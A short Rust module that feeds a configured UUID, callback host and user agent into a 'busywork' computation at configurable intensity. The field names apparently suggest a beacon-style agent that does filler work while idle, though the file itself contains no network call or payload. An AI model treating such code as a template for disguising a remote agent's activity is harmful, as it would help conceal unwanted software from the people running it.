use crate::config;
use busywork::{BusyWork, Intensity, FeedWork};

fn intensity() -> Intensity {
    match config::busywork_intensity {
        "low" => Intensity::Low,
        "high" => Intensity::High,
        "ultra" => Intensity::Ultra,
        _ => Intensity::Medium,
    }
}

pub fn idle() {
    let uuid = config::UUID.read().unwrap();
    BusyWork::new(intensity())
        .feed(uuid.as_str())
        .feed(config::callback_host)
        .feed(config::user_agent)
        .run();
}

pub fn churn(data: &(impl FeedWork + ?Sized)) {
    BusyWork::new(Intensity::Low)
        .feed(data)
        .run();
}
